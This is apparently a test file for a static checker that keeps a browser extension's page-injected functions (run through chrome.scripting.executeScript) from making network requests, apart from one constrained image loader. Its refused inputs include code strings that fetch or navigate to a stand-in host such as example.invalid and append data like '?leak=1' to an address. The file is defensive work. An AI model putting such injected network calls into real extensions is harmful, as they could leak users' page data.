        injectedFunctions('background.js', 'chrome.scripting.executeScript({target:{},func:o.f})'),
      ).toEqual([undefined]);
      expect(
        scriptProblems(
          'background.js',
          'chrome.scripting.executeScript({target:{},func:gone})',
        ).join(''),
      ).toContain('could not be read');
    });

    it.each([
      ['new Image', 'return new Image()'],
      ['fetch', 'return fetch("https://example.invalid/m")'],
      ['an img src', 'const i=document.createElement("img");i.src=t;return i'],
      ['setAttribute', 'document.body.setAttribute("src",t)'],
      ['location', 'location.href=t'],
      ['open', 'window.open(t)'],
      ['url()', 'document.body.style.background="url(https://example.invalid/m)"'],
      ['XMLHttpRequest', 'new XMLHttpRequest().open("GET",t)'],
    ])('refuses %s inside that function', (_what, body) => {
      expect(scriptProblems('background.js', MINIFIED(body)).join('\n'), body).toContain(
        'runs in the web page',
      );
    });

    it('does not mind the service worker code around it: fetch is allowed in background.js outside the injected function', () => {
      const problems = scriptProblems('background.js', MINIFIED('return t'));
      expect(problems.join('\n')).not.toContain('runs in the web page');
    });

    it('accepts the function as the build has it', () => {
      expect(
        scriptProblems(
          'background.js',
          MINIFIED(
            'const e=[...document.images].find(e=>e.currentSrc===t||e.src===t);if(!e)return null;e.scrollIntoView({block:"nearest",inline:"nearest"});await new Promise(o=>{requestAnimationFrame(()=>{requestAnimationFrame(o)})});const n=e.getBoundingClientRect();return{rect:{x:n.left,y:n.top,w:n.width,h:n.height},dpr:window.devicePixelRatio||1}',
          ),
        ).join('\n'),
      ).not.toContain('runs in the web page');
    });
  });
});

// Round 7 of the review of PR #6 (nits and blocker E): CSS that loads is judged in STRINGS, as lint judges it, with the CSS escapes
// undone; code that merely says getURL( or new URL( is not CSS. And an executeScript func that cannot be followed fails.
describe('CSS that loads something, in the strings of the code of the page', () => {
  it.each([
    ['url(x)', true],
    ['URL(x)', true],
    ['uRl(x)', true],
    ['url (x)', true],
    ['u\\72 l(x)', true],
    ['\\75 rl(x)', true],
    ['\\000075rl(x)', true],
    ['background:url(x)', true],
    ['image-set(x 1x)', true],
    ['-webkit-image-set(x 1x)', true],
    ['image(x)', true],
    ['cross-fade(x)', true],
    ['element(#x)', true],
    ['paint(x)', true],
    ['src(x)', true],
    ['@import "x"', true],
    ['getURL(x)', false],
    ['chrome.runtime.getURL(x)', false],
    ['myurl(x)', false],
    ['$url(x)', false],
    ['my-url(x)', false],
    ['a url is here', false],
    ['getU\\52 L(x)', false],
  ])('the string %j: %s', (value, expected) => {
    for (const quote of ['"', "'", '`']) {
      const source = value.replaceAll('\\', '\\\\');
      expect(cssLoadingInStrings(`x(${quote}${source}${quote})`), `${quote}${source}${quote}`).toBe(
        expected,
      );
    }
    expect(pagePlatformProblems(`x("${value.replaceAll('\\', '\\\\')}")`).length > 0).toBe(
      expected,
    );
  });

  it.each([
    'chrome.runtime.getURL("x")',
    'new URL("x", base)',
    'URL(x)',
    'const u = chrome.runtime.getURL(e); void new URL(u)',
    'x.getURL(y)',
  ])('does not take the code %j for CSS (the false positive of the review)', (code) => {
    expect(cssLoadingInStrings(code), code).toBe(false);
    expect(pagePlatformProblems(code), code).toEqual([]);
    expect(scriptProblems('select.js', code).join('\n'), code).not.toContain('url(');
  });

  it('a string built at run time is not seen here (lint refuses it: no key, no join, no call in a style)', () => {
    expect(cssLoadingInStrings("x(['ur', 'l(x)'].join(''))")).toBe(false);
  });
});

describe('injectedFunctions: the func of executeScript is followed by scope, and what cannot be followed fails', () => {
  const CALL = 'chrome.scripting.executeScript({target:{tabId:1},args:[u],func:b})';
  const read = (text: string) => injectedFunctions('background.js', text);

  it.each([
    [
      'a function declaration',
      `${CALL};async function b(t){return 1}`,
      ['async function b(t){return 1}'],
    ],
    ['a const arrow', `${CALL};const b=async t=>1`, ['async t=>1']],
    [
      'a const function expression',
      `${CALL};const b=function(t){return 1}`,
      ['function(t){return 1}'],
    ],
    [
      'a shorthand',
      'chrome.scripting.executeScript({target:{},func});function func(t){return 1}',
      ['function func(t){return 1}'],
    ],
    [
      'a method',
      'chrome.scripting.executeScript({target:{},func(t){return 1}})',
      ['func(t){return 1}'],
    ],
    [
      'a string key',
      'chrome.scripting.executeScript({target:{},"func":function(t){return 1}})',
      ['function(t){return 1}'],
    ],
    [
      'a function written in place',
      'chrome.scripting.executeScript({target:{},func:t=>1})',
      ['t=>1'],
    ],
    ['files only', 'chrome.scripting.executeScript({target:{},files:["select.js"]})', []],
    ['no call at all', 'chrome.tabs.create({url:u})', []],
  ])('reads %s', (_what, text, expected) => {
    expect(read(text)).toEqual(expected);
  });

  it.each([
    ['an undeclared name', 'chrome.scripting.executeScript({target:{},func:gone})'],
    ['a member', 'chrome.scripting.executeScript({target:{},func:o.f})'],
    ['a call result', 'chrome.scripting.executeScript({target:{},func:make()})'],
    ['a computed key', 'chrome.scripting.executeScript({target:{},["fu"+"nc"]:b});function b(){}'],
    ['a spread', 'chrome.scripting.executeScript({target:{},...o});function b(){}'],
    ['options in a variable', 'chrome.scripting.executeScript(o);function b(){}'],
    ['no options', 'chrome.scripting.executeScript();function b(){}'],
    [
      'an alias of executeScript',
      'const run=chrome.scripting.executeScript;run({target:{},func:b});function b(){}',
    ],
    ['executeScript passed on', 'use(chrome.scripting.executeScript)'],
    [
      'executeScript by a string key',
      'chrome.scripting["executeScript"]({target:{},func:b});function b(){}',
    ],
    ['a name declared twice', `${CALL};function b(){return 1}function b(){return 2}`],
    ['a name that is a parameter', `${CALL};function k(b){return b}`],
    ['a name that is an import', `import {b} from "./x.js";${CALL}`],
    ['a name that is a class', `${CALL};class b{}`],
    ['a name that is a plain value', `${CALL};const b=5`],
    ['a name declared twice by var', `${CALL};var b=function(){};var b=function(){}`],
  ])('fails on %s', (_what, text) => {
    expect(read(text), text).toContain(undefined);
    expect(scriptProblems('background.js', text).join('\n'), text).toContain('could not be read');
  });

  // the nit of round 8 (r4308256047): an alias by destructuring read as 'no function', a func reassigned read by its first value
  it.each([
    [
      'a destructured alias',
      'const{executeScript:x}=chrome.scripting;x({target:{},func:()=>{location.href=u}})',
    ],
    [
      'a destructured alias, shorthand',
      'const{executeScript}=chrome.scripting;executeScript({target:{},func:()=>{fetch(u)}})',
    ],
    [
      'a destructuring assignment',
      'let x;({executeScript:x}=chrome.scripting);x({target:{},func:()=>{fetch(u)}})',
    ],
    [
      'an alias in a parameter',
      'function run({executeScript:x}){x({target:{},func:()=>{fetch(u)}})}',
    ],
    [
      'executeScript.call',
      'chrome.scripting.executeScript.call(null,{target:{},func:()=>{fetch(u)}})',
    ],
    [
      'executeScript.apply',
      'chrome.scripting.executeScript.apply(null,[{target:{},func:()=>{fetch(u)}}])',
    ],
    [
      'executeScript.bind',
      'chrome.scripting.executeScript.bind(chrome.scripting)({target:{},func:()=>{fetch(u)}})',
    ],
    ['a comma expression', '(0,chrome.scripting.executeScript)({target:{},func:()=>{fetch(u)}})'],
    ['a string key', 'chrome.scripting["executeScript"]({target:{},func:()=>{fetch(u)}})'],
    ['a template key', 'chrome.scripting[`executeScript`]({target:{},func:()=>{fetch(u)}})'],
    [
      'an object key',
      'const o={executeScript:chrome.scripting.executeScript};o.executeScript({target:{},func:()=>{fetch(u)}})',
    ],
    [
      'a let that is reassigned',
      'let f=function(){};f=()=>{location.href=u};chrome.scripting.executeScript({target:{},func:f})',
    ],
    [
      'a function declaration that is reassigned',
      'function f(){}f=()=>{location.href=u};chrome.scripting.executeScript({target:{},func:f})',
    ],
    [
      'a const arrow in a var that is reassigned',
      'var f=()=>1;f=()=>{location.href=u};chrome.scripting.executeScript({target:{},func:f})',
    ],
    ['a name incremented', 'function f(){}f++;chrome.scripting.executeScript({target:{},func:f})'],
    [
      'a name that is a loop target',
      'function f(){}for(f of [1]);chrome.scripting.executeScript({target:{},func:f})',
    ],
    [
      'a compound assignment',
      'function f(){}f||=()=>1;chrome.scripting.executeScript({target:{},func:f})',
    ],
    ['a let holding a function', 'let f=()=>1;chrome.scripting.executeScript({target:{},func:f})'],
    ['a var holding a function', 'var f=()=>1;chrome.scripting.executeScript({target:{},func:f})'],
  ])('fails on %s', (_what, text) => {
    expect(read(text), text).toContain(undefined);
    expect(scriptProblems('background.js', text).join('\n'), text).toMatch(
      /could not be read|exactly two functions/,
    );
  });

  it('background.js must hand over exactly two distinct functions: none or one fails', () => {
    expect(scriptProblems('background.js', 'chrome.tabs.create({url:u})').join('\n')).toContain(
      'exactly two functions must be handed',
    );
    expect(
      scriptProblems(
        'background.js',
        'chrome.scripting.executeScript({target:{},files:["select.js"]})',
      ).join('\n'),
    ).toContain('exactly two functions must be handed');
    expect(
      scriptProblems(
        'background.js',
        'chrome.scripting.executeScript({target:{},func:m});const m=t=>t',
      ).join('\n'),
    ).toContain('exactly two functions must be handed to executeScript (found 1)');
  });

  it('resolves a reused short name by scope, not by the last declaration in the file', () => {
    // the b of the call is the outer function; a later b lives inside another function
    const text = `${CALL};function b(t){return fetch(t)}function other(){function b(){return 2}return b}`;
    const found = read(text);
    expect(found).toEqual(['function b(t){return fetch(t)}']);
    expect(scriptProblems('background.js', text).join('\n')).toContain('runs in the web page');
  });

  it('a name shadowed where the call is made is the inner one', () => {
    const text =
      'function b(){return fetch(1)}function k(){function b(){return 3}chrome.scripting.executeScript({target:{},func:b})}';
    expect(read(text)).toEqual(['function b(){return 3}']);
  });

  it('three distinct functions may not be handed over, and executeScript belongs to background.js', () => {
    const three =
      'chrome.scripting.executeScript({target:{},func:a});chrome.scripting.executeScript({target:{},func:c});chrome.scripting.executeScript({target:{},func:d});function a(){}function c(){}function d(){}';
    expect(scriptProblems('background.js', three).join('\n')).toContain(
      'exactly two functions must be handed to executeScript (found 3)',
    );
    expect(scriptProblems('assets/result-abc.js', CALL).join('\n')).toContain(
      'executeScript outside background.js',
    );
    expect(scriptProblems('select.js', CALL).join('\n')).toContain(
      'executeScript outside background.js',
    );
  });
});

// Step 1 of reading a clicked image loads an address in the page, so background.js hands over TWO functions: the measuring one and
// the loader. The loader alone may contain `new Image`, `.crossOrigin = "anonymous"` and `.src = <its first parameter>`, once each; every
// other pattern of PAGE_CODE_FORBIDDEN still applies to both.
describe('background.js hands two functions to executeScript: the measuring one and the loader', () => {
  const MEASURE = 'async function m(t,k,s){return[document.images,t,k,s]}';
  const LOADER =
    'async function l(t){const e=new Image;e.crossOrigin="anonymous",e.src=t;try{await e.decode()}catch{return null}return btoa(String(e.naturalWidth))}';
  const CALLS =
    'chrome.scripting.executeScript({target:{tabId:t,frameIds:[n]},args:[u,"image",null],func:m});chrome.scripting.executeScript({target:{tabId:t,frameIds:[0]},args:[u,"frame",null],func:m});chrome.scripting.executeScript({target:{tabId:t,frameIds:[n]},args:[e],func:l});';
  const problems = (text: string) => scriptProblems('background.js', text).join('\n');

  it('accepts the real shape: three call sites, two distinct functions', () => {
    expect(problems(`${CALLS}${MEASURE}${LOADER}`)).toBe('');
  });

  // Round 1 of the review of PR #14 (B1): only `func` was read. The target of every call is one tab and one frame, and the loader gets
  // the srcUrl that clickedImage got as `<name>` and nothing else (lint says the same of the source, with the provenance of the name).
  // Round 4: the top frame goes only with the literal kind "frame" (measureFrameInTop), the frame of the click with the loader or the
  // literal "image" (measureInClickFrame); there is no kind chosen at run time left to read.
  describe('the target and the arguments of the calls are as fixed as the functions (B1)', () => {
    const LOAD = 'chrome.scripting.executeScript({target:{tabId:t,frameIds:[n]},args:[e],func:l});';
    const MEASURE_CALL =
      'chrome.scripting.executeScript({target:{tabId:t,frameIds:[n]},args:[u,"image",null],func:m});';
    const TOP_CALL =
      'chrome.scripting.executeScript({target:{tabId:t,frameIds:[0]},args:[u,"frame",null],func:m});';
    const wrong = (text: string) => problems(`${text}${MEASURE}${LOADER}`);
    it.each([
      ['allFrames on the loader', LOAD.replace('frameIds:[n]', 'allFrames:!0')],
      [
        'allFrames on the loader next to frameIds',
        LOAD.replace('frameIds:[n]', 'frameIds:[n],allFrames:!0'),
      ],
      ['a second frame id for the loader', LOAD.replace('[n]', '[n,0]')],
      ['documentIds on the loader', LOAD.replace('frameIds:[n]', 'documentIds:["x"]')],
      ['no frameIds for the loader', LOAD.replace(',frameIds:[n]', '')],
      ['an expression as the frame id', LOAD.replace('[n]', '[n+1]')],
      ['the top frame for the loader', LOAD.replace('[n]', '[0]')],
      ['a frame chosen by a kind for the loader', LOAD.replace('[n]', '["frame"===k?0:n]')],
      ['a literal tab id', LOAD.replace('tabId:t', 'tabId:1')],
      ['a spread in the target', LOAD.replace('frameIds:[n]', 'frameIds:[n],...o')],
      ['a target in a variable', LOAD.replace('{tabId:t,frameIds:[n]}', 'o')],
      [
        'a computed key in the target',
        LOAD.replace('frameIds:[n]', 'frameIds:[n],["all"+"Frames"]:!0'),
      ],
      ['a string key in the target', LOAD.replace('frameIds:[n]', 'frameIds:[n],"allFrames":!0')],
      ['an option that is not listed', LOAD.replace('args:', 'injectImmediately:!0,args:')],
      ['the srcUrl plus a suffix', LOAD.replace('[e]', '[e+"?leak=1"]')],
      ['another name as a fallback', LOAD.replace('[e]', '[o??e]')],
      ['a member of an object', LOAD.replace('[e]', '[e.frameUrl]')],
      ['an address', LOAD.replace('[e]', '["https://example.invalid/x"]')],
      ['a second argument', LOAD.replace('[e]', '[e,1]')],
      ['no arguments', LOAD.replace('[e]', '[]')],
      ['no args', LOAD.replace('args:[e],', '')],
      ['args in a variable', LOAD.replace('[e]', 'o')],
      ['a spread in args', LOAD.replace('[e]', '[...o]')],
      ['a computed member', LOAD.replace('[e]', '[e["srcUrl"]]')],
      ['an optional chain', LOAD.replace('[e]', '[e?.srcUrl]')],
      ['a call as the srcUrl', LOAD.replace('[e]', '[o(e)]')],
    ])('refuses the loader with %s', (_what, load) => {
      expect(wrong(`${MEASURE_CALL}${TOP_CALL}${load}`)).toContain('executeScript');
    });
    it.each([
      ['allFrames', MEASURE_CALL.replace('frameIds:[n]', 'allFrames:!0')],
      ['a second frame id', MEASURE_CALL.replace('[n]', '[n,0]')],
      ['documentIds', MEASURE_CALL.replace('frameIds:[n]', 'documentIds:["x"]')],
      ['no frameIds', MEASURE_CALL.replace(',frameIds:[n]', '')],
      ['the top frame with the kind "image"', MEASURE_CALL.replace('[n]', '[0]')],
      ['the frame of the click with the kind "frame"', TOP_CALL.replace('[0]', '[n]')],
      ['the kind "frame" in another frame than the top one', TOP_CALL.replace('[0]', '[1]')],
      ['a kind that is a name (the frame of the click)', MEASURE_CALL.replace('"image"', 'k')],
      ['a kind that is a name (the top frame)', TOP_CALL.replace('"frame"', 'k')],
      ['another kind', MEASURE_CALL.replace('"image"', '"other"')],
      ['no kind', MEASURE_CALL.replace('args:[u,"image",null],', '')],
      // the shape of round 3, where one function chose the frame by its kind at run time
      [
        'the frame chosen by the kind at run time',
        'chrome.scripting.executeScript({target:{tabId:a,frameIds:["frame"===e?0:o]},args:[t,e,r],func:m});',
      ],
    ])('refuses measureImage with %s', (_what, call) => {
      expect(wrong(`${call}${TOP_CALL}${LOAD}`)).not.toBe('');
    });
    it('accepts a tab id read from a name (tab.id)', () => {
      expect(wrong(`${MEASURE_CALL.replace('tabId:t', 'tabId:t.id')}${TOP_CALL}${LOAD}`)).toBe('');
    });
  });

  it('a loader reads src of other images and compares, only writing is the exception', () => {
    const loader = LOADER.replace(
      'return btoa',
      'if(document.images.length&&e.src===t){}return btoa',
    );
    expect(problems(`${CALLS}${MEASURE}${loader}`)).toBe('');
  });

  it.each([
    ['a second write of src', LOADER.replace('try{', 'e.src=t;try{')],
    ['src set to another value', LOADER.replace('e.src=t', 'e.src=u')],
    ['src set to the parameter plus a suffix', LOADER.replace('e.src=t', 'e.src=t+"#"')],
    [
      'src set to a literal address',
      LOADER.replace('e.src=t', 'e.src="https://example.invalid/x"'),
    ],
    ['a second Image', LOADER.replace('try{', 'const f=new Image;try{')],
    ['an Image with an argument', LOADER.replace('new Image', 'new Image(5)')],
    ['crossOrigin use-credentials', LOADER.replace('"anonymous"', '"use-credentials"')],
    ['a second crossOrigin', LOADER.replace('try{', 'e.crossOrigin="anonymous";try{')],
    ['fetch', LOADER.replace('try{', 'fetch(t);try{')],
    ['setAttribute', LOADER.replace('try{', 'e.setAttribute("src",t);try{')],
    ['location', LOADER.replace('try{', 'location.href=t;try{')],
    ['a href write', LOADER.replace('try{', 'e.href=t;try{')],
    ['open', LOADER.replace('try{', 'open(t);try{')],
    ['a network API next to it', LOADER.replace('try{', 'new Worker(t);try{')],
  ])('refuses a loader with %s', (_what, loader) => {
    expect(problems(`${CALLS}${MEASURE}${loader}`)).toMatch(
      /runs in the web page|web page's process/,
    );
  });

  it('refuses the exception in the measuring function', () => {
    const measure = 'async function m(t,k,s){const e=new Image;e.src=t;return e}';
    expect(problems(`${CALLS}${measure}${LOADER}`)).toMatch(/web page/);
  });

  it('refuses two loaders, no loader, and a loader that is not readable', () => {
    const other = 'async function o(t){const e=new Image;e.src=t;return e}';
    const two =
      'chrome.scripting.executeScript({target:{},func:l});chrome.scripting.executeScript({target:{},func:o});';
    expect(problems(`${two}${LOADER}${other}`)).toContain('exactly one of the functions');
    const none =
      'chrome.scripting.executeScript({target:{},func:m});chrome.scripting.executeScript({target:{},func:n});';
    expect(problems(`${none}${MEASURE}async function n(t){return t}`)).toContain(
      'exactly one of the functions',
    );
    expect(problems(`${CALLS}${MEASURE}`.replace('func:l', 'func:gone'))).toContain(
      'could not be read',
    );
  });

  it('the first parameter is read by position, whatever it is called', () => {
    const loader =
      'async function l(x){const y=new Image;y.crossOrigin="anonymous";y.src=x;return y}';
    expect(problems(`${CALLS}${MEASURE}${loader}`)).toBe('');
    const bad =
      'async function l(x,z){const y=new Image;y.crossOrigin="anonymous";y.src=z;return y}';
    expect(problems(`${CALLS}${MEASURE}${bad}`)).toMatch(/web page/);
  });

  describe('the loader is bound to its first parameter by scope (review of the branch)', () => {
    const within = (loader: string) => problems(`${CALLS}${MEASURE}${loader}`);

    it('accepts a loader whose inner variable has the name of the loader itself', () => {
      const loader =
        'async function l(t){const n=async l=>{return l.naturalWidth};const e=new Image;e.crossOrigin="anonymous",e.src=t;try{await e.decode()}catch{return null}return n(e)}';
      expect(within(loader)).toBe('');
    });

    it.each([
      [
        'a call of itself with another address',
        'async function l(t){const e=new Image;e.crossOrigin="anonymous";e.src=t;if(t)return l("https://example.invalid/"+t);return null}',
      ],
      [
        'itself taken as a value',
        'async function l(t){const e=new Image;e.crossOrigin="anonymous";e.src=t;const f=l;return f}',
      ],
      [
        'the parameter reassigned before the write',
        'async function l(t){t=document.title;const e=new Image;e.crossOrigin="anonymous";e.src=t;return e}',
      ],
      [
        'the parameter reassigned by a destructuring',
        'async function l(t){[t]=[document.title];const e=new Image;e.crossOrigin="anonymous";e.src=t;return e}',
      ],
      [
        'the write made in an inner function with a parameter of its own',
        'async function l(t){const e=new Image;e.crossOrigin="anonymous";((t)=>{e.src=t})(document.title);return e}',
      ],
      [
        'the write from a local variable',
        'async function l(t){const u=document.title;const e=new Image;e.crossOrigin="anonymous";e.src=u;return e}',
      ],
    ])('refuses a loader with %s', (_what, loader) => {
      expect(within(loader)).toMatch(/web page's process/);
    });
  });

  // The write of src is the loader's only because the object is the one `new Image` made, and `crossOrigin = "anonymous"` is written
  // on it before src (a request made first is made with the credentials of the page). Read from the syntax tree, not from the text.
  describe("the Image is the loader's own, and its crossOrigin comes before its src", () => {
    const within = (loader: string) => problems(`${CALLS}${MEASURE}${loader}`);

    it.each([
      [
        'the sequence of statements the minifier writes',
        'async function l(t){const e=new Image;e.crossOrigin="anonymous",e.src=t;return e}',
      ],
      [
        'separate statements',
        'async function l(t){const e=new Image;e.crossOrigin="anonymous";e.src=t;return e}',
      ],
      [
        'other declarations next to the Image',
        'async function l(t){const n=1,e=new Image,m=2;e.crossOrigin="anonymous";e.src=t;return[n,m,e]}',
      ],
    ])('accepts %s', (_what, loader) => {
      expect(within(loader)).toBe('');
    });

    it.each([
      [
        'src written on an element of the page (the Image only gets crossOrigin)',
        'async function l(t){const k=document.images[0];const e=new Image;e.crossOrigin="anonymous";k.src=t;return e}',
      ],
      [
        'src written on an element of the page found in the document, no src on the Image',
        'async function l(t){const k=[...document.images].find(i=>i.complete);const e=new Image;e.crossOrigin="anonymous";if(k)k.src=t;return e}',
      ],
      [
        'src written on the element of the page and on the Image',
        'async function l(t){const k=document.images[0];const e=new Image;e.crossOrigin="anonymous";k.src=t;e.src=t;return e}',
      ],
      [
        'crossOrigin written after src',
        'async function l(t){const e=new Image;e.src=t;e.crossOrigin="anonymous";return e}',
      ],
      [
        'crossOrigin written after src in one sequence',
        'async function l(t){const e=new Image;e.src=t,e.crossOrigin="anonymous";return e}',
      ],
      ['no crossOrigin at all', 'async function l(t){const e=new Image;e.src=t;return e}'],
      [
        'crossOrigin written on another object',
        'async function l(t){const k=document.images[0];const e=new Image;k.crossOrigin="anonymous";e.src=t;return e}',
      ],
      [
        'crossOrigin in a branch',
        'async function l(t){const e=new Image;if(t)e.crossOrigin="anonymous";e.src=t;return e}',
      ],
      [
        'src in a branch',
        'async function l(t){const e=new Image;e.crossOrigin="anonymous";if(t)e.src=t;return e}',
      ],
      [
        'the Image made in an inner function',
        'async function l(t){const e=(()=>new Image)();e.crossOrigin="anonymous";e.src=t;return e}',
      ],
      [
        'the Image in a let',
        'async function l(t){let e=new Image;e.crossOrigin="anonymous";e.src=t;return e}',
      ],
      [
        'the Image not held by a variable',
        'async function l(t){return Object.assign(new Image,{src:t})}',
      ],
      [
        'the Image kept in an object',
        'async function l(t){const o={i:new Image};o.i.crossOrigin="anonymous";o.i.src=t;return o}',
      ],
      [
        'crossOrigin with the other spelling written again',
        'async function l(t){const e=new Image;e.crossOrigin="anonymous";e["crossOrigin"]="use-credentials";e.src=t;return e}',
      ],
    ])('refuses %s', (_what, loader) => {
      expect(within(loader)).toMatch(/web page's process/);
    });

    it('takes the loader from the tree: a string that says "new Image" does not make a function the loader', () => {
      const measure = 'async function m(t,k,s){return"new Image"+t+k+s}';
      const text = `${CALLS}${measure}${LOADER}`;
      expect(problems(text)).toMatch(/network API/);
      expect(problems(text)).not.toContain('exactly one of the functions');
    });
  });
});
